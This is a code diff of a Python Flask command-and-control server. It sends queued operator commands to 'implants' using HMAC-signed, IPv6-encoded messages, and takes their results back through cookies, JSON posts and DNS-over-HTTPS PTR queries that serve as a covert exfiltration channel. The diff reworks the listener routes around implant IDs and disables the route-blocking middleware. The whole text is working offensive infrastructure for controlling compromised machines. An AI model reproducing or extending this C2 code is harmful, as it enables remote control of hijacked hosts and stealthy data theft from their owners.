@@ -77,35 +77,7 @@ for listener in config["listeners"]:
     if name not in route_status[path]:
         route_status[path][name] = {}
     route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
-
-
-def handle_dns_ptr():
-    """
-    Handle DNS PTR requests
-    :return:
-    """
-    return
-
-def handle_http_req():
-    """
-    Handle basic HTTP requests
-    :return:
-    """
-    return
-
-def handle_req_auth():
-    """
-    Handle if a listener requires authentication
-    :return:
-    """
-    return
-
-def handle_req_comp():
-    """
-    Handles requests using compression
-    :return: The decompressed data
-    """
-    return
+print(route_status)
 
 
 def find_get_val(req_meth):
@@ -446,156 +418,24 @@ def handle_client(client_socket):
         client_socket.close()
 
 
-def register_user_bp(blueprint):
-    """
-    Register user defined routes using Flask Blueprints
-    """
-    custom_listeners = config["custom_listeners"]
-
-    for custom_listener in custom_listeners:
-        cust_name = custom_listener['name']
-        cust_path = custom_listener['path']
-        cust_method = custom_listener['method'].upper()
-        use_auth = custom_listener['use_auth'].lower() == "true"
-        use_comp = custom_listener['use_comp'].lower() == "true"
-        use_dns = custom_listener['use_dns'].lower() == "true"
-        use_http = custom_listener['use_http'].lower() == "true"
-
-        @blueprint.route(cust_path, methods=[cust_method], endpoint=cust_name)
-        def dynamic_route():
-            logger.info(f"custom route accessed: {cust_name}")
-            # set global vals
-            global auth_check, rcv_token, rcv_timestamp
-            # Load the PSK from the implant config file
-            imp_psk1 = imp_conf["psk1"]
-            # Handle compressed requests differently
-            if use_comp:
-                # Get the cookie holding the encoded data
-                url_decoded_data = request.cookies.get("da")
-                logger.info("looks like an encoded request")
-                logger.info("got cookies")
-                url_decoded_data = url_decoded_data.rstrip("=")  # Remove existing padding
-                padding = len(url_decoded_data) % 4
-                if padding:
-                    url_decoded_data += "=" * (4 - padding)  # Add necessary padding
-
-                compressed_data = base64.b64decode(url_decoded_data)
-                decompressed_data = zlib.decompress(compressed_data)
-                unparsed_query = decompressed_data.decode('utf-8')
-                parsed_data = urllib.parse.parse_qs(unparsed_query)
-
-                rcv_timestamp = parsed_data.get('timestamp')
-                rcv_token = parsed_data.get('token')
-                logger.info("got the token and timestamp from cookies")
-            # If compression is not enabled
-            if not use_comp:
-                rcv_timestamp = request.cookies.get('timestamp')
-                rcv_token = request.cookies.get('token')
-
-            # If use_auth is set to false then pass the auth_check
-            if not use_auth:
-                logger.info("custom route not using authentication for GETs")
-                auth_check = True
-            else:
-                auth_check = verify_auth_token(path, rcv_token[0], rcv_timestamp[0])
-            # Auth check and compression functions have completed, now to process
-            # Need branching logic for if using DNS or HTTP methods
-            if auth_check is True:
-                if use_http:
-                    operator, command = get_waiting_command(path)
-                    if operator and command is False:
-                        logger.error("operator and command in queue returned as false")
-                        return 404
-                    checkout_command(path, operator)
-                    command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-                    logger.info("sending command and HMAC to implant")
-                    hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
-                    hmac_sig = hmac_k.hexdigest()
-                    return jsonify(
-                        message=command,
-                        key=hmac_sig
-                    )
-                elif use_dns:
-                    # Decode the incoming DNS query
-                    if request.method == 'POST':
-                        dns_query = request.data
-                    elif request.method == 'GET':
-                        dns_query_base64 = request.args.get('dns')
-                        dns_query = base64.urlsafe_b64decode(dns_query_base64)
-                    name_list = []
-
-                    # Parse the DNS query using dnslib
-                    dns_packet = DNSRecord.parse(dns_query)
-                    header = dns_packet.header
-                    transaction_id = header.id  # Transaction ID
-
-                    # Create the response packet
-                    response_packet = DNSRecord(header)
-                    response_packet.header.id = transaction_id
-                    response_packet.header.qr = 1  # Query Response
-                    response_packet.header.aa = 1  # Authoritative Answer
-                    response_packet.header.ra = 1  # Recursion Available
-                    query = dns_packet.q
-                    qtype = QTYPE[query.qtype]  # Query type (e.g., A, PTR, etc.)
-
-                    # Iterate over all questions in the DNS query
-                    for question in dns_packet.questions:
-                        qname = question.qname  # Query name
-                        name_list.append(qname)
-
-                    # Add response based on query type
-                    if qtype == "PTR":
-                        # Handle reverse DNS (PTR) query
-                        decoded_list = []
-                        for in_name in name_list:
-                            decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
-                            decoded_list.append(decoded_text.strip('\x00'))
-                        # print(ipv6_encoder.ipv6_to_string(decoded_list))
-                        logger.info(f"{transaction_id} sending us data")
-                        # Get the data
-                        result = ' '.join(decoded_list)
-                        # Check which operator is waiting for a result
-                        queue = implant_checkout[str(transaction_id)]
-                        operator = queue.get()
-                        logger.info("got queue for operator")
-                        logger.info(f"sending {operator} command")
-                        handle_update(operator, transaction_id, result)
-                        response_packet.add_answer(
-                            RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
-                        )
-                    else:
-                        # Unsupported query type
-                        response_packet.header.rcode = RCODE.NOTIMP  # Not implemented
-
-                    # Sending the response back
-                    response_data = response_packet.pack()
-                    # Convert bytearray to bytes
-                    response_data = bytes(response_data)
-                    logger.info(f"sending response: {response_data} {type(response_data)}")
-                    return Response(response_data, content_type="application/dns-message")
-            else:
-                logger.error(f"error: auth_check failed")
-                return 404
-
-
 def register_routes():
     """
     Initial default route names are retrieved from the s_conf.json file
     Default, the enabled state is True so these paths are active and used.
-    If you want to use custom paths, methods, etc. then set the defaults to false
+    If you want don't want to use them, set it to false
     """
 
     @app.route(listeners_list[0]['path'], methods=['GET'])
-    def def_endpoint1(path):
+    def def_endpoint1():
         """
         Verifies requests for commands with an HMAC and shared key
-        :param path: This represents the implant ID
+        :param get_imp_id: This represents the implant ID
         :return: Either the waiting command or error
         """
         imp_psk1 = imp_conf["psk1"]
         logger.info("GET incoming for authenticated listener URI")
-        try:
-            # Get the cookie holding the encoded data
+        if request.cookies.get("da"):
+            # Get the cookie holding the compressed data
             url_decoded_data = request.cookies.get("da")
             logger.info("looks like an encoded request")
             logger.info("got cookies")
@@ -611,13 +451,15 @@ def register_routes():
 
             rcv_timestamp = parsed_data.get('timestamp')
             rcv_token = parsed_data.get('token')
+            get_imp_id = parsed_data.get('id')
             logger.info("got the token and timestamp from cookies")
-            if verify_auth_token(path, rcv_token[0], rcv_timestamp[0]) is True:
-                operator, command = get_waiting_command(path)
+            logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
+            if verify_auth_token(get_imp_id[0], rcv_token[0], rcv_timestamp[0]) is True:
+                operator, command = get_waiting_command(get_imp_id)
                 if operator and command is False:
                     logger.error("operator and command in queue returned as false")
                     return "error"
-                checkout_command(path, operator)
+                checkout_command(get_imp_id, operator)
                 command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                 logger.info("sending command and HMAC to implant")
                 hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
@@ -629,16 +471,19 @@ def register_routes():
             else:
                 logger.error(f"error: verify_auth_token failed")
                 return "error"
-        except Exception as e:
-            logger.info(f"{e} occurred")
+        else:
+            logger.info("uncompressed data")
             rcv_timestamp = request.cookies.get('timestamp')
             rcv_token = request.cookies.get('token')
-            if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
-                operator, command = get_waiting_command(path)
+            get_imp_id = request.cookies.get('id')
+            logger.info("got the token and timestamp from cookies")
+            logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
+            if verify_auth_token(get_imp_id, rcv_token, rcv_timestamp) is True:
+                operator, command = get_waiting_command(get_imp_id)
                 if operator and command is False:
                     logger.error("operator and command in queue returned as false")
                     return "error"
-                checkout_command(path, operator)
+                checkout_command(get_imp_id, operator)
                 command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                 logger.info("sending command and HMAC to implant")
                 hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
@@ -653,29 +498,81 @@ def register_routes():
 
 
     @app.route(listeners_list[1]['path'], methods=['POST'])
-    def def_endpoint2(path):
-        try:
-            logger.info(f"{path} sending us data")
+    def def_endpoint2():
+        imp_id = request.cookies.get('id')
+        if request.content_type == "application/json":
+            logger.info(f"{imp_id} sending us data")
             # Get the data
             result = request.get_json()
             # The result comes in as a JSON object under the field msg
             result = result.get("msg")
             # Check which operator is waiting for a result
-            queue = implant_checkout[path]
+            queue = implant_checkout[imp_id]
             logger.info("got queue for operator")
             operator = queue.get()
             logger.info(f"sending {operator} command")
-            handle_update(operator, path, result)
+            handle_update(operator, imp_id, result)
             return "200"
-        except Exception as e:
-            logger.error(f"error getting data: {e}")
-            return "error"
+        elif request.content_type == "application/dns-message":
+            dns_query = request.data
+            name_list = []
+            # Parse the DNS query using dnslib
+            dns_packet = DNSRecord.parse(dns_query)
+            header = dns_packet.header
+            transaction_id = header.id  # Transaction ID
+
+            # Create the response packet
+            response_packet = DNSRecord(header)
+            response_packet.header.id = transaction_id
+            response_packet.header.qr = 1  # Query Response
+            response_packet.header.aa = 1  # Authoritative Answer
+            response_packet.header.ra = 1  # Recursion Available
+            query = dns_packet.q
+            qtype = QTYPE[query.qtype]  # Query type (e.g., A, PTR, etc.)
+
+            # Iterate over all questions in the DNS query
+            for question in dns_packet.questions:
+                qname = question.qname  # Query name
+                name_list.append(qname)
+
+            # Add response based on query type
+            if qtype == "PTR":
+                # Handle reverse DNS (PTR) query
+                decoded_list = []
+                for in_name in name_list:
+                    decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
+                    decoded_list.append(decoded_text.strip('\x00'))
+                # print(ipv6_encoder.ipv6_to_string(decoded_list))
+                logger.info(f"{transaction_id} sending us data")
+                # Get the data
+                result = ' '.join(decoded_list)
+                # Check which operator is waiting for a result
+                queue = implant_checkout[str(transaction_id)]
+                operator = queue.get()
+                logger.info("got queue for operator")
+                logger.info(f"sending {operator} command")
+                handle_update(operator, transaction_id, result)
+                response_packet.add_answer(
+                    RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
+                )
+            else:
+                # Unsupported query type
+                response_packet.header.rcode = RCODE.NOTIMP  # Not implemented
+
+            # Sending the response back
+            response_data = response_packet.pack()
+            # Convert bytearray to bytes
+            response_data = bytes(response_data)
+            logger.info(f"sending response: {response_data} {type(response_data)}")
+            return Response(response_data, content_type="application/dns-message")
+        else:
+            return 404
 
 
 # Register routes initially
 register_routes()
 
-
+'''
 @app.before_request
 def restrict_routes():
     """Middleware to block disabled routes."""
@@ -685,67 +582,19 @@ def restrict_routes():
         if find_get_val(request.method):
             logger.warning(f"disabled route accessed: {request.path} {request.method}")
             abort(404)  # Return a 404 if the route is disabled
+'''
 
 
 @app.route('/dns-query', methods=['GET', 'POST'])
 def doh_handler():
+    print(request.content_type)
     # Decode the incoming DNS query
     if request.method == 'POST':
         dns_query = request.data
     elif request.method == 'GET':
         dns_query_base64 = request.args.get('dns')
         dns_query = base64.urlsafe_b64decode(dns_query_base64)
-    name_list = []
 
-    # Parse the DNS query using dnslib
-    dns_packet = DNSRecord.parse(dns_query)
-    header = dns_packet.header
-    transaction_id = header.id  # Transaction ID
-
-    # Create the response packet
-    response_packet = DNSRecord(header)
-    response_packet.header.id = transaction_id
-    response_packet.header.qr = 1  # Query Response
-    response_packet.header.aa = 1  # Authoritative Answer
-    response_packet.header.ra = 1  # Recursion Available
-    query = dns_packet.q
-    qtype = QTYPE[query.qtype]  # Query type (e.g., A, PTR, etc.)
-
-    # Iterate over all questions in the DNS query
-    for question in dns_packet.questions:
-        qname = question.qname  # Query name
-        name_list.append(qname)
-
-    # Add response based on query type
-    if qtype == "PTR":
-        # Handle reverse DNS (PTR) query
-        decoded_list = []
-        for in_name in name_list:
-            decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
-            decoded_list.append(decoded_text.strip('\x00'))
-        # print(ipv6_encoder.ipv6_to_string(decoded_list))
-        logger.info(f"{transaction_id} sending us data")
-        # Get the data
-        result = ' '.join(decoded_list)
-        # Check which operator is waiting for a result
-        queue = implant_checkout[str(transaction_id)]
-        operator = queue.get()
-        logger.info("got queue for operator")
-        logger.info(f"sending {operator} command")
-        handle_update(operator, transaction_id, result)
-        response_packet.add_answer(
-            RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
-        )
-    else:
-        # Unsupported query type
-        response_packet.header.rcode = RCODE.NOTIMP  # Not implemented
-
-    # Sending the response back
-    response_data = response_packet.pack()
-    # Convert bytearray to bytes
-    response_data = bytes(response_data)
-    logger.info(f"sending response: {response_data} {type(response_data)}")
-    return Response(response_data, content_type="application/dns-message")
 
 
 def start_flask():
